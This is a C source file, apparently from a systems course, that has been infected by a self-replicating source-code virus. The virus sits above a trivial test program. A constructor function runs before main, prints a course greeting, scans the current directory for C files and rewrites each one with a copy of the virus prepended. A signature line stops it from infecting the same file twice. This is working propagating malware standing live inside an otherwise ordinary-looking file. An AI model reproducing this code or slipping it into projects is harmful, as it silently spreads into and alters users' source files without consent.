// INFECTED_BY_HNUer
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>

// --- VIRUS START ---
const char *VIRUS_TEMPLATE = 
"const char *SIGN = \"// INFECTED_BY_HNUer\\n\";\n"
"\n"
"void write(FILE *wp, const char *str) {\n"
"    fputs(\"\\\"\", wp);\n"
"    while (*str) {\n"
"        if (*str == '\\n') fputs(\"\\\\n\\\"\\n\\\"\", wp);\n"
"        else if (*str == '\"') fputs(\"\\\\\\\"\", wp);\n"
"        else if (*str == '\\\\') fputs(\"\\\\\\\\\", wp);\n"
"        else fputc(*str, wp);\n"
"        str++;\n"
"    }\n"
"    fputs(\"\\\";\\n\", wp);\n"
"}\n"
"\n"
"void infect(const char *filename, const char *template_str) {\n"
"    FILE *fp = fopen(filename, \"r\");\n"
"    if (!fp) return;\n"
"    char first_line[256];\n"
"    if (fgets(first_line, sizeof(first_line), fp) != NULL) {\n"
"        if (strcmp(first_line, SIGN) == 0) { fclose(fp); return; }\n"
"    }\n"
"    fseek(fp, 0, SEEK_END); long file_size = ftell(fp); fseek(fp, 0, SEEK_SET);\n"
"    char *original_content = (char *)malloc(file_size + 1);\n"
"    fread(original_content, 1, file_size, fp);\n"
"    original_content[file_size] = '\\0';\n"
"    fclose(fp);\n"
"\n"
"    FILE *wp = fopen(filename, \"w\");\n"
"    if (!wp) { free(original_content); return; }\n"
"    fputs(SIGN, wp);\n"
"    fputs(\"#include <stdio.h>\\n\", wp);\n"
"    fputs(\"#include <stdlib.h>\\n\", wp);\n"
"    fputs(\"#include <string.h>\\n\", wp);\n"
"    fputs(\"#include <dirent.h>\\n\\n\", wp);\n"
"    fputs(\"// --- VIRUS START ---\\n\", wp);\n"
"    fputs(\"const char *VIRUS_TEMPLATE = \\n\", wp);\n"
"    write(wp, template_str);\n"
"    fputs(template_str, wp);\n"
"    fputs(\"// --- VIRUS END ---\\n\\n\", wp);\n"
"    fputs(\"void __attribute__((constructor)) init() {\\n\", wp);\n"
"    fputs(\"    printf(\\\"Welcome to HNU CSAPP!\\\\n\\\");\\n\", wp);\n"
"    fputs(\"    scan(VIRUS_TEMPLATE);\\n\", wp);\n"
"    fputs(\"}\\n\\n\", wp);\n"
"    fputs(original_content, wp);\n"
"    fclose(wp);\n"
"    free(original_content);\n"
"}\n"
"\n"
"void scan(const char *template_str) {\n"
"    DIR *dir = opendir(\".\");\n"
"    if (dir == NULL) return;\n"
"    struct dirent *entry;\n"
"    while ((entry = readdir(dir)) != NULL) {\n"
"        if (strstr(entry->d_name, \".c\") != NULL ) {\n"
"            infect(entry->d_name, template_str);\n"
"        }\n"
"    }\n"
"    closedir(dir);\n"
"}\n"
"";
const char *SIGN = "// INFECTED_BY_HNUer\n";

void write(FILE *wp, const char *str) {
    fputs("\"", wp);
    while (*str) {
        if (*str == '\n') fputs("\\n\"\n\"", wp);
        else if (*str == '"') fputs("\\\"", wp);
        else if (*str == '\\') fputs("\\\\", wp);
        else fputc(*str, wp);
        str++;
    }
    fputs("\";\n", wp);
}

void infect(const char *filename, const char *template_str) {
    FILE *fp = fopen(filename, "r");
    if (!fp) return;
    char first_line[256];
    if (fgets(first_line, sizeof(first_line), fp) != NULL) {
        if (strcmp(first_line, SIGN) == 0) { fclose(fp); return; }
    }
    fseek(fp, 0, SEEK_END); long file_size = ftell(fp); fseek(fp, 0, SEEK_SET);
    char *original_content = (char *)malloc(file_size + 1);
    fread(original_content, 1, file_size, fp);
    original_content[file_size] = '\0';
    fclose(fp);

    FILE *wp = fopen(filename, "w");
    if (!wp) { free(original_content); return; }
    fputs(SIGN, wp);
    fputs("#include <stdio.h>\n", wp);
    fputs("#include <stdlib.h>\n", wp);
    fputs("#include <string.h>\n", wp);
    fputs("#include <dirent.h>\n\n", wp);
    fputs("// --- VIRUS START ---\n", wp);
    fputs("const char *VIRUS_TEMPLATE = \n", wp);
    write(wp, template_str);
    fputs(template_str, wp);
    fputs("// --- VIRUS END ---\n\n", wp);
    fputs("void __attribute__((constructor)) init() {\n", wp);
    fputs("    printf(\"Welcome to HNU CSAPP!\\n\");\n", wp);
    fputs("    scan(VIRUS_TEMPLATE);\n", wp);
    fputs("}\n\n", wp);
    fputs(original_content, wp);
    fclose(wp);
    free(original_content);
}

void scan(const char *template_str) {
    DIR *dir = opendir(".");
    if (dir == NULL) return;
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (strstr(entry->d_name, ".c") != NULL ) {
            infect(entry->d_name, template_str);
        }
    }
    closedir(dir);
}
// --- VIRUS END ---

void __attribute__((constructor)) init() {
    printf("Welcome to HNU CSAPP!\n");
    scan(VIRUS_TEMPLATE);
}



#include <stdio.h>

int main() {
    printf("This is a test file.\n");
    return 0;
}
